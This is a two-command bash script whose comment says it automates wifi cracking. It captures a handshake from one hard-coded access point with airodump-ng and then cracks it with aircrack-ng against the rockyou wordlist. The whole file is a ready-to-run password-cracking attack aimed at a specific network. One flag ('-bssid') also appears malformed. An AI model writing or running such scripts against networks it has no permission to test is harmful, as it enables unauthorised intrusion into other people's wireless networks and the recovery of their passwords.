#!/bin/bash

# Script for automating some of the tasks for wifi cracking

airodump-ng -w cwWiFi.aird -c 11 -bssid 00:1A:8C:82:1C:97 wlan0mon

aircrack-ng -w /usr/share/wordlists/rockyou.txt cwWiFi.aird-01.cap
